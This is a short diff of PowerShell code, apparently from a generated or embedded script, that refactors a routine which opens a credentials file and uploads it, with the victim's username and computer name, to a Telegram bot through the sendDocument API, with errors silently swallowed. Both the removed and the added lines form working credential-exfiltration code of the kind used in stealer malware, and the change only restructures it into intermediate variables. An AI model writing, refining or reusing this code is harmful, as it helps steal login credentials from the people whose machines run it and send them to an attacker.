@@ -191,14 +191,19 @@ try {
 Add-Type -AssemblyName System.Net.Http
 `$httpClient = New-Object System.Net.Http.HttpClient
 `$form = New-Object System.Net.Http.MultipartFormDataContent
-`$form.Add((New-Object System.Net.Http.StringContent(`$TelegramChatId)), "chat_id")
-`$form.Add((New-Object System.Net.Http.StringContent("Login: `$env:USERNAME @ `$env:COMPUTERNAME")), "caption")
+`$chatIdContent = New-Object System.Net.Http.StringContent(`$TelegramChatId)
+`$form.Add(`$chatIdContent, "chat_id")
+`$captionText = "Login: `$env:USERNAME @ `$env:COMPUTERNAME"
+`$captionContent = New-Object System.Net.Http.StringContent(`$captionText)
+`$form.Add(`$captionContent, "caption")
 `$fileStream = [System.IO.File]::OpenRead(`$credsFile)
 `$fileContent = New-Object System.Net.Http.StreamContent(`$fileStream)
-`$form.Add(`$fileContent, "document", [System.IO.Path]::GetFileName(`$credsFile))
+`$fileName = [System.IO.Path]::GetFileName(`$credsFile)
+`$form.Add(`$fileContent, "document", `$fileName)
 
 try {
-    `$response = `$httpClient.PostAsync("https://api.telegram.org/bot`$TelegramBotToken/sendDocument", `$form).Result
+    `$apiUrl = "https://api.telegram.org/bot`$TelegramBotToken/sendDocument"
+    `$response = `$httpClient.PostAsync(`$apiUrl, `$form).Result
 } catch {}
 
 if (`$fileStream) { `$fileStream.Dispose() }
